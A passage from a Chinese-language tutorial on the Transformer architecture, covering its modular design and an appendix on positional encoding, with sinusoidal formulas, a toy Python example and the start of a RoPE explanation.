0。更加具体的操作方式就不在这里讲解了，感兴趣的朋友可以自己去搜索资料了解学习。</p>
</blockquote>
<p>不知你是否注意到，Transformer 这种逐词生成模式，与如今对话式大语言模型的响应方式如出一辙——是的，这正是因为 <strong>GPT 系列模型本质上就是由 Transformer 的解码器部分演变而来</strong>。仅使用编码器部分，则构成了另一里程碑模型 <strong>BERT</strong> 的核心架构。到这里，你已经离当今的大语言模型的本质又更进一步！</p>
<p>至此，你已经掌握了 Transformer 的核心架构与运行逻辑。那么，在你未来的实际项目中，是否每次都需要“全盘照搬”整个Transformer结构呢？<strong>我觉得并不需要</strong>。Transformer 的强大之处恰恰在于其<strong>模块化设计</strong>：你可以根据任务需要，灵活选取其中的自注意力层、交叉注意力层、位置编码等组件，甚至对它们进行改造或重组，反正你都已经了解它的原理了，拆开重构也不是什么难事。</p>
<p>这种“拆解-重组-创新”的思维，正是深度学习模型演进中的常见路径。其实到这里，你会发现，那些令人生畏的前沿网络架构，其实大多是由我们熟悉的基本模块——如 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>Softmax</mtext></mrow><annotation encoding="application/x-tex">\text{Softmax}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord text"><span class="mord">Softmax</span></span></span></span></span></span>、<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>Linear</mtext></mrow><annotation encoding="application/x-tex">\text{Linear}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord text"><span class="mord">Linear</span></span></span></span></span></span>、<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>LayerNorm</mtext></mrow><annotation encoding="application/x-tex">\text{LayerNorm}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord text"><span class="mord">LayerNorm</span></span></span></span></span></span>、残差连接，CNN等——通过巧妙的排列组合而来。例如，将 Transformer 的自注意力与卷积模块结合，便催生了 <strong>ConvTransformer</strong>；在视觉任务中仅使用编码器并调整注意力机制，就诞生了 <strong>Vision Transformer (ViT)</strong>。有时候，仅仅是两个已有结构的有机融合，就能在特定任务上取得突破，这本身就是一个重要的创新方向。</p>
<p><strong>真正的学习，始于理解，成于重构，最终抵达创新</strong>。不妨从一个小实验开始。理论与实践的交汇处，正是灵感迸发的地方。未来或许有一天，你会站在这些基础模块之上，搭建出属于自己、甚至影响某个领域的新架构。期待你在理解 Transformer 之后，不仅能复现它，更能拆解它、改进它，最终超越它。深度学习的世界里，没有终极的模型，只有不断演进的思想——而读到这里的你，已经走在了这条路上。</p>
<h3 data-id="heading-1">附录1：位置编码</h3>
<p>如上文所述，自注意力机制能够出色地捕捉序列元素之间的相关性，但其计算过程本质上是<strong>无序的</strong>——它无法区分“我爱自然语言处理”与“自然语言处理爱我”之间的顺序差异。为了弥补这一关键缺陷，我们需要为模型引入<strong>位置信息</strong>。</p>
<p>位置编码的核心思想非常直观：为序列中每个位置的词向量添加一个独特的“位置标记”。这个标记是一个与词向量维度相同的向量，最终通过<strong>相加</strong>的方式与原始词向量融合，从而让每个输入都“记住”自己在序列中的位置。</p>
<p>一个最直观的方案：用二进制或自然数的独热编码来表示位置。例如，对于一个三维向量，可以这样设计位置编码：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 原始输入序列 (例如3个词，每个词用3维向量表示)</span>
X = [[<span class="hljs-number">1.34</span>, <span class="hljs-number">2.83</span>, <span class="hljs-number">0.51</span>],
     [<span class="hljs-number">4.12</span>, <span class="hljs-number">5.10</span>, <span class="hljs-number">3.11</span>],
     [<span class="hljs-number">0.41</span>, <span class="hljs-number">3.71</span>, <span class="hljs-number">1.33</span>]]

<span class="hljs-comment"># 一种简单的位置编码（此处仅为示意，并非Transformer实际所用）</span>
P_simple = [[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>],  <span class="hljs-comment"># 位置0</span>
            [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>],  <span class="hljs-comment"># 位置1</span>
            [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>]]  <span class="hljs-comment"># 位置2</span>

<span class="hljs-comment"># 融合了位置信息的最终输入</span>
X_input = X + P_simple = = [[<span class="hljs-number">1.34</span>, <span class="hljs-number">2.83</span>, <span class="hljs-number">1.51</span>],
     						[<span class="hljs-number">4.12</span>, <span class="hljs-number">6.10</span>, <span class="hljs-number">3.11</span>],
     						[<span class="hljs-number">0.41</span>, <span class="hljs-number">4.71</span>, <span class="hljs-number">2.33</span>]]
</code></pre>
<p>对，就是这么简单粗暴，只不过一般情况下，我们不用二进制递增序列来表示位置编码向量，而是用正余弦位置编码序列来表示（原论文中的方法）。但其本质都是一样的。</p>
<p>对照上述的例子，正余弦位置编码矩阵如下所示</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>0</mn></msub><mo stretchy="false">(</mo><mn>0</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mn>0</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mn>0</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>0</mn></msub><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>0</mn></msub><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>f</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">P = \begin{bmatrix}
 f_{0}(0) &amp; f_{1}(0) &amp; f_{2}(0)\\
  f_{0}(1)&amp;  f_{1}(1)&amp;f_{2}(1) \\
  f_{0}(2)&amp;  f_{1}(2)&amp;f_{2}(2)
\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M403 1759 V84 H666 V0 H319 V1759 v0 v1759 h347 v-84&#10;H403z M403 1759 V0 H319 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">0</span><span class="mclose">)</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">2</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">0</span><span class="mclose">)</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">2</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">0</span><span class="mclose">)</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord">2</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M347 1759 V0 H0 V84 H263 V1759 v0 v1759 H0 v84 H347z&#10;M347 1759 V0 H263 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>f</mi><mi>i</mi></msub><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>s</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mfrac><mi>t</mi><mrow><mn>1</mn><msup><mn>0</mn><mrow><mn>8</mn><mi>i</mi><mi mathvariant="normal">/</mi><mi>D</mi></mrow></msup></mrow></mfrac><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>i</mi><mtext>为偶数</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>c</mi><mi>o</mi><mi>s</mi><mo stretchy="false">(</mo><mfrac><mi>t</mi><mrow><mn>1</mn><msup><mn>0</mn><mrow><mn>8</mn><mi>i</mi><mi mathvariant="normal">/</mi><mi>D</mi></mrow></msup></mrow></mfrac><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>i</mi><mtext>为奇数</mtext></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">f_{i}(t) = \left\{\begin{matrix}
  sin(\frac{t}{10^{8i/D}} )
&amp; 
 i为偶数
\\
cos(\frac{t}{10^{8i/D}} )
  &amp;
i为奇数
\end{matrix}\right.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.4508em;vertical-align:-0.9754em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">{</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4754em;"><span style="top:-3.6354em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="mord mathnormal">in</span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8246em;"><span style="top:-2.6146em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight"><span class="mord mtight">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.822em;"><span style="top:-2.822em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5357em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">8</span><span class="mord mathnormal mtight">i</span><span class="mord mtight">/</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">D</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3854em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mclose">)</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">cos</span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8246em;"><span style="top:-2.6146em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight"><span class="mord mtight">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.822em;"><span style="top:-2.822em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5357em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">8</span><span class="mord mathnormal mtight">i</span><span class="mord mtight">/</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">D</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3854em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9754em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4754em;"><span style="top:-3.6354em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">i</span><span class="mord cjk_fallback">为偶数</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">i</span><span class="mord cjk_fallback">为奇数</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9754em;"><span/></span></span></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p>其中<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"/><span class="mord mathnormal">t</span></span></span></span></span>为序列中第<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"/><span class="mord mathnormal">t</span></span></span></span></span>个向量，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi></mrow><annotation encoding="application/x-tex">D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span></span>表示词向量的维度，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span>表示第<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span>维，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span>从0开始计算</p>
<p>其实当时我学到位置编码的时候，我就有一个疑问，为什么可以直接将位置编码和词向量进行相加？这样做难道不会破坏原有词向量本身所包含的信息吗？为什么这个相加操作就能赋予原序列位置信息？</p>
<p>下面举个形象一点的例子，想象一下我们的输入序列是一组图片（承载语义信息），而位置编码是一组透明的、印有位置序号（如1,2,3…）的胶片。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/242eb01598a34875a6702da8d915573f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=oYoriw76J04hve2yCv2%2FhRrLAUM%3D" alt="c16.jpg" width="90%" loading="lazy"/></p>
<p>将胶片叠加到图片上后，你既能清晰地看到图片内容（语义），也能毫不费力地识别出叠加在上面的数字（位置）。两者信息是共存的。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb745a4c9a08420e915d774a4da8c757~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=tViPJhuLi3MPxMpo8UXuNmfdMBw%3D" alt="c17.jpg" width="90%" loading="lazy"/></p>
<p>你可能会说，不对呀，我们人脑可是见过很多图片和数字的，当然能轻松的看出来图片中嵌入了数字，但是Transformer它能看出来吗？加入的这些序列信息难道不会构成噪声吗？</p>
<p>不要忘了，Transformer可是大语言模型的基础架构，它可是非常强大的，Transformer区分原始序列中包含的序列信息可以说是再简单不过的事情了。</p>
<p>从数学上来解释，位置编码就是<strong>利用了高维表示空间的冗余度和深度神经网络的强大解耦能力</strong>，词向量通常存在于数百甚至数千维的高维空间中。在高维空间中，向量方向极其丰富，两个随机向量几乎总是近似正交的（点积接近零）。词向量和位置编码向量可以看作是从不同“坐标系”出发的向量。简单的相加，相当于在高维空间中进行了一次“合成”。在高维空间中，低相关性的向量相加不会导致信息丢失，反而形成唯一复合表示。</p>
<p>这里我们暂不深入探讨为何简单的二进制编码不被采用，而正弦余弦编码却如此有效——这背后涉及到很多数学理论上的东西了。但如果你对正余弦位置编码感兴趣，非常推荐看看这位UP主的讲解：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1XH4y1T76e%2F" target="_blank" title="https://www.bilibili.com/video/BV1XH4y1T76e/" ref="nofollow noopener noreferrer">王木头学科学</a></p>
<p>然而，技术总是在演进。在当今大语言模型的实践中，标准的正弦余弦位置编码已不再是主流的选择。研究者们发现，直接让模型关注<strong>元素的相对位置</strong>往往比记住绝对位置更为有效和泛化。因此，一系列更先进的<strong>相对位置编码</strong>方法应运而生，例如：ALiBi，RoPE, YaRN, T5 Relative...</p>
<p>由于RoPE旋转位置编码比较流行，下面就简单的讲解一下其算法流程</p>
<p>我们抛开所有上面讲过的内容，仅从数学的角度看看如何对任意矩阵<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>进行RoPE变换</p>
<ul>
<li>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>为<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">m</span></span></span></span></span>行<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">d</span></span></span></span></span>列矩阵（共<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">m</span></span></span></span></span>个维度为<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">d</span></span></span></span></span>的向量，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math 